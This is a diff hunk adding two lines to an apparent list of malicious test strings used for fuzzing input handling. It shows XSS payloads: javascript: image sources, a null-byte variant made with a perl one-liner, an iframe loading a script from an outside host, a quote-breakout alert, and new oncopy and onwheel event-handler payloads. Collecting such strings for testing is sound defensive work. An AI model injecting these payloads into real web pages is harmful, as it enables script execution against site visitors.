@@ -493,6 +493,8 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <IMG SRC="javascript:alert('XSS')"
 <iframe src=http://ha.ckers.org/scriptlet.html <
 \";alert('XSS');//
+<u oncopy=alert()> Copy me</u>
+<i onwheel=alert(1)> Scroll over me </i>
 <plaintext>
 http://a/%%30%30
 
